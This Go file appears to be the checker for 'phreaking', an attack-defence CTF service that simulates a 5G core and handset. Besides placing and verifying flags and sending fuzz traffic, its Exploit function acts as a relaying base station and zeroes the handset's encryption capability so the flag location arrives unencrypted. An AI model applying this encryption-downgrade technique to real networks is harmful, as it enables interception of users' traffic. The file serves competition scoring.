package handler

import (
	"bytes"
	"context"
	"crypto/rand"
	crand "crypto/rand"
	"errors"
	"fmt"
	mrand "math/rand"
	"net"
	"os"
	"strconv"

	"checker/internal/crypto"
	"checker/internal/io"
	"checker/internal/nas"
	"checker/internal/ngap"
	"checker/internal/parser"
	"checker/internal/pb"

	"github.com/enowars/enochecker-go"
	"github.com/gofrs/uuid"
	"github.com/redis/go-redis/v9"
	"go.uber.org/zap"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
)

var serviceInfo = &enochecker.InfoMessage{
	ServiceName:     "phreaking",
	FlagVariants:    1,
	NoiseVariants:   3,
	HavocVariants:   2,
	ExploitVariants: 1,
}

var ErrVariantNotFound = errors.New("variant not found")

type Handler struct {
	logger *zap.Logger
	db     *redis.Client
}

func New(log *zap.Logger, db *redis.Client) *Handler {
	return &Handler{
		logger: log,
		db:     db,
	}
}

func createMumble(prefix string, err error) error {
	return enochecker.NewMumbleError(errors.New(prefix + ": " + err.Error()))
}

func (h *Handler) PutFlag(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
	portNum := strconv.Itoa(int(message.CurrentRoundId % 10))
	port := "993" + portNum
	var conn *grpc.ClientConn
	conn, err := grpc.Dial(message.Address+":"+port, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	c := pb.NewLocationClient(conn)

	grpcEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_GRPC_PASS"

	md := metadata.Pairs("auth", string(os.Getenv(grpcEnvVar)))
	ctx_grpc := metadata.NewOutgoingContext(context.Background(), md)
	_, err = c.UpdateLocation(ctx_grpc, &pb.Loc{Position: message.Flag})
	if err != nil {
		return nil, enochecker.NewMumbleError(errors.New("put flag failed"))
	}
	port = "606" + portNum
	if err = h.db.Set(ctx, message.TaskChainId, port, 0).Err(); err != nil {
		h.logger.Error(err.Error())
		return nil, enochecker.NewMumbleError(errors.New("not able to write taskid to db"))
	}
	return enochecker.NewPutFlagInfo(port), nil
}

func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskMessage) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return createMumble("Get flag", err)
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return createMumble("Get flag", err)
	}

	port, err := h.db.Get(ctx, message.TaskChainId).Result()
	if err != nil {
		return createMumble("Get flag", errors.New("no entry for task id"))
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return createMumble("Get flag", err)
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return createMumble("Get flag", err)
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return createMumble("Get flag", err)
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Get flag", err)
	}

	var gmm nas.GmmHeader

	reply, err := io.Recv(ueConn)
	if err != nil {
		return createMumble("Get flag", err)
	}

	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Get flag", err)
	}

	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return createMumble("Get flag", err)
	}

	// AuthReq
	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Get flag", err)
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Get flag", err)
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Get flag", err)
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return createMumble("Get flag", err)
	}

	reply, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Get flag", err)
	}

	amfUeNgapId := down.AmfUeNgapId

	// AuthRes

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Get flag", err)
	}

	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Get flag", err)
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Get flag", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Get flag", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Get flag", err)
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return createMumble("Get flag", err)
	}

	// LocationUpdate
	reply, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Get flag", err)
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Get flag", err)
	}

	keyEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_SIM_KEY"

	key := []byte(string(os.Getenv(keyEnvVar)))

	dec, err := crypto.DecryptAES(gmm.Message, key)
	if err != nil {
		return createMumble("Get flag", err)
	}

	var loc nas.LocationUpdateMsg
	err = parser.DecodeMsg(dec, &loc)
	if err != nil {
		return createMumble("Get flag", err)
	}
	if loc.Location == message.Flag {
		return nil
	}
	return enochecker.ErrFlagNotFound
}

func (h *Handler) GetFlag(ctx context.Context, message *enochecker.TaskMessage) error {
	switch message.VariantId {
	case 0:
		return h.getFlagLocation(ctx, message)
	}

	return ErrVariantNotFound
}

func (h *Handler) GetServiceInfo() *enochecker.InfoMessage {
	return serviceInfo
}

func (h *Handler) Exploit(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return nil, err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return nil, err
	}

	portNum := strconv.Itoa(int(message.CurrentRoundId % 10))
	port := "606" + portNum

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return nil, err
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return nil, err
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return nil, err
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return nil, err
	}

	var gmm nas.GmmHeader

	reply, err := io.Recv(ueConn)
	if err != nil {
		return nil, err
	}

	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return nil, err
	}

	var reg nas.NASRegRequestMsg
	err = parser.DecodeMsg(gmm.Message, &reg)
	if err != nil {
		return nil, errors.New("cannot decode")
	}

	// DISABLE EA
	reg.SecCap.EaCap = 0

	msg, err := parser.EncodeMsg(&reg)
	if err != nil {
		return nil, err
	}

	gmm.Message = msg
	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return nil, err
	}

	// AuthReq
	reply, err = io.Recv(coreConn)
	if err != nil {
		return nil, err
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return nil, err
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return nil, err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return nil, err
	}

	reply, err = io.Recv(ueConn)
	if err != nil {
		return nil, err
	}

	amfUeNgapId := down.AmfUeNgapId

	// AuthRes

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return nil, err
	}

	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return nil, err
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return nil, err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return nil, err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return nil, err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return nil, err
	}

	// LocationUpdate
	reply, err = io.Recv(ueConn)
	if err != nil {
		return nil, err
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return nil, err
	}

	var loc nas.LocationUpdateMsg
	err = parser.DecodeMsg(gmm.Message, &loc)
	if err != nil {
		return nil, err
	}
	return enochecker.NewExploitInfo(loc.Location), nil
}

func (h *Handler) PutNoise(ctx context.Context, message *enochecker.TaskMessage) error {
	portNum := strconv.Itoa(int(message.CurrentRoundId % 10))
	port := "606" + portNum
	if err := h.db.Set(ctx, message.TaskChainId, port, 0).Err(); err != nil {
		h.logger.Error(err.Error())
		return enochecker.NewMumbleError(errors.New("not able to write taskid to db"))
	}
	return nil
}

func (h *Handler) GetNoise(ctx context.Context, message *enochecker.TaskMessage) error {
	port, err := h.db.Get(ctx, message.TaskChainId).Result()
	if err != nil {
		return enochecker.NewMumbleError(errors.New("put noise was not called beforehand"))
	}
	switch message.VariantId {
	case 0:
		return h.gnb(ctx, message, port)
	case 1:
		return h.checkNullEncCore(ctx, message)
	case 2:
		return h.checkNullEncUE(ctx, message, port)
	}

	return ErrVariantNotFound
}

func (h *Handler) checkNullEncCore(ctx context.Context, message *enochecker.TaskMessage) error {
	keyEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_SIM_KEY"
	key := []byte(string(os.Getenv(keyEnvVar)))

	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return createMumble("Noise core", err)
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return createMumble("Noise core", err)
	}

	defer func() {
		coreConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return createMumble("Noise core", err)
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise core", err)
	}

	regMsg := nas.NASRegRequestMsg{
		MobileId: nas.MobileIdType{Mcc: 1, Mnc: 1, HomeNetPki: 0, Msin: 0},
		SecCap:   nas.SecCapType{EaCap: nas.EA0, IaCap: nas.IA1},
	}

	msg, err := parser.EncodeMsg(&regMsg)
	if err != nil {
		return createMumble("Noise core", err)
	}

	gmm := nas.GmmHeader{Security: false, Mac: [8]byte{}, MessageType: nas.NASRegRequest, Message: msg}
	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return createMumble("Noise core", err)
	}

	reply, err := io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise core", err)
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise core", err)
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise core", err)
	}

	amfUeNgapId := down.AmfUeNgapId

	var authReq nas.NASAuthRequestMsg
	err = parser.DecodeMsg(down.NasPdu.Message, &authReq)
	if err != nil {
		return createMumble("Noise core", err)
	}

	if !(bytes.Equal(crypto.IA2(authReq.AuthRand, key), authReq.Auth)) {
		return createMumble("Noise", errors.New("cannot authenticate core"))
	}

	res := crypto.IA2(authReq.Rand, key)
	authRes := nas.NASAuthResponseMsg{Res: res}
	authResMsg, mac, err := nas.BuildMessagePlain(&authRes)
	if err != nil {
		return createMumble("Noise core", err)
	}

	gmm = nas.GmmHeader{Security: false, Mac: mac, MessageType: nas.NASAuthResponse, Message: authResMsg}
	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise core", err)
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise core", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise core", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise core", err)
	}

	var secMode nas.NASSecurityModeCommandMsg
	err = parser.DecodeMsg(down.NasPdu.Message, &secMode)
	if err != nil {
		return createMumble("Noise core", err)
	}

	if secMode.EaAlg != 0 {
		return createMumble("Noise core", errors.New("null encryption not chosen in security mode command"))

	}

	pduEstReq := nas.PDUSessionEstRequestMsg{PduSesId: 0, PduSesType: 0}
	pduEstReqMsg, mac, err := nas.BuildMessage(0, secMode.IaAlg, &pduEstReq, key)
	if err != nil {
		return createMumble("Noise core", err)
	}
	gmm = nas.GmmHeader{Security: true, Mac: mac, MessageType: nas.PDUSessionEstRequest, Message: pduEstReqMsg}
	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise core", err)
	}

	// PDUSessionAccept
	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise core", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise core", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise core", err)
	}

	var pduEstAcc nas.PDUSessionEstAcceptMsg

	err = parser.DecodeMsg(down.NasPdu.Message, &pduEstAcc)
	if err != nil {
		return createMumble("Noise core", err)
	}

	pduReq := nas.PDUReqMsg{PduSesId: pduEstAcc.PduSesId, Request: []byte("gopher://gopher.website.org/")}

	pduReqMsg, mac, err := nas.BuildMessage(0, secMode.IaAlg, &pduReq, key)
	if err != nil {
		return createMumble("Noise core", err)
	}

	gmm = nas.GmmHeader{Security: true, Mac: mac, MessageType: nas.PDUReq, Message: pduReqMsg}
	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise core", err)
	}

	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise core", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise core", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise core", err)
	}

	var pduRes nas.PDUResMsg

	err = parser.DecodeMsg(down.NasPdu.Message, &pduRes)
	if err != nil {
		return createMumble("Noise core", err)
	}
	return nil
}

func (h *Handler) checkNullEncUE(ctx context.Context, message *enochecker.TaskMessage, port string) error {
	keyEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_SIM_KEY"
	key := []byte(string(os.Getenv(keyEnvVar)))

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	defer ueConn.Close()

	var gmm nas.GmmHeader

	regreqmsg, err := io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	err = parser.DecodeMsg(regreqmsg, &gmm)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	var regreq nas.NASRegRequestMsg
	err = parser.DecodeMsg(gmm.Message, &regreq)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	sec := regreq.SecCap

	randToken := make([]byte, 32)
	rand.Read(randToken)

	authRand := make([]byte, 32)
	rand.Read(authRand)

	auth := crypto.IA2(authRand, key)

	authReq := nas.NASAuthRequestMsg{Rand: randToken, AuthRand: authRand, Auth: auth}

	authReqbuf, mac, err := nas.BuildMessagePlain(&authReq)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	gmm = nas.GmmHeader{false, mac, nas.NASAuthRequest, authReqbuf}

	io.SendGmm(ueConn, gmm)

	_, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	ea := 0
	ia := mrand.Intn(5)
	if ia == 0 {
		ia = 1
	}

	secModeCmd := nas.NASSecurityModeCommandMsg{EaAlg: uint8(ea),
		IaAlg: uint8(ia), ReplaySecCap: sec,
	}
	secModeMsg, mac, err := nas.BuildMessage(uint8(ea), uint8(nas.IA2), &secModeCmd, key)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	gmm = nas.GmmHeader{false, mac, nas.NASSecurityModeCommand, secModeMsg}
	io.SendGmm(ueConn, gmm)

	locupdatemsg, err := io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	err = parser.DecodeMsg(locupdatemsg, &gmm)
	if err != nil {
		return createMumble("Noise UE", err)
	}

	var loc nas.LocationUpdateMsg
	err = crypto.CheckIntegrity(uint8(ia), gmm.Message, gmm.Mac, key)
	if err != nil {
		return createMumble("Noise UE", fmt.Errorf("Integrity alg %d not working for UE", ia))
	}
	err = parser.DecodeMsg(gmm.Message, &loc)
	if err != nil {
		return createMumble("Noise UE", errors.New("Null encryption not working"))
	}
	return nil
}

func (h *Handler) gnb(ctx context.Context, message *enochecker.TaskMessage, port string) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	var gmm nas.GmmHeader

	reply, err := io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// AuthReq
	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	reply, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	amfUeNgapId := down.AmfUeNgapId

	// AuthRes

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// LocationUpdate
	reply, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// PDUSessionReq
	reply, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// PDUSessionAccept

	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// PDUReq

	reply, err = io.Recv(ueConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	// PDURes

	reply, err = io.Recv(coreConn)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return createMumble("Noise gNB", err)
	}

	return nil
}

func (h *Handler) Havoc(ctx context.Context, message *enochecker.TaskMessage) error {
	portNum := strconv.Itoa(int(message.CurrentRoundId % 10))
	port := "606" + portNum
	switch message.VariantId {
	case 0:
		return h.randomData(ctx, message, port)
	case 1:
		return h.randomGmm(ctx, message, port)
	}

	return ErrVariantNotFound
}

func (h *Handler) getRandomBytes(maxSize int) []byte {
	length := mrand.Intn(maxSize)
	buf := make([]byte, length)
	_, err := crand.Read(buf)
	if err != nil {
		h.logger.Sugar().Warnf("error while generating random bytes for havoc: %s", err)
	}
	return buf
}

func (h *Handler) randomData(ctx context.Context, message *enochecker.TaskMessage, port string) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	for i := 0; i < mrand.Intn(3); i++ {
		err = io.Send(coreConn, h.getRandomBytes(252))
		if err != nil {
			break
		}
		err = io.Send(ueConn, h.getRandomBytes(252))
		if err != nil {
			break
		}
	}
	return nil
}

func (h *Handler) randomGmm(ctx context.Context, message *enochecker.TaskMessage, port string) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	_, err = io.Recv(ueConn)
	if err != nil {
		return enochecker.NewMumbleError(err)
	}

	for i := 0; i < mrand.Intn(3); i++ {
		macbuf := make([]byte, 8)
		_, err := crand.Read(macbuf)
		gmm := nas.GmmHeader{Security: mrand.Intn(1) == 1,
			Mac:         [8]byte(macbuf),
			MessageType: nas.NasMsgType(mrand.Intn(30)),
			Message:     h.getRandomBytes((252))}

		uuid, _ := uuid.NewV4()
		up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: mrand.Uint32(), AmfUeNgapId: ngap.AmfUeNgapIdType(uuid)}
		err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
		if err != nil {
			break
		}

		macbuf = make([]byte, 8)
		_, err = crand.Read(macbuf)
		gmm = nas.GmmHeader{Security: mrand.Intn(1) == 1,
			Mac:         [8]byte(macbuf),
			MessageType: nas.NasMsgType(mrand.Intn(30)),
			Message:     h.getRandomBytes((252))}

		err = io.SendGmm(ueConn, gmm)
		if err != nil {
			break
		}
	}
	return nil
}
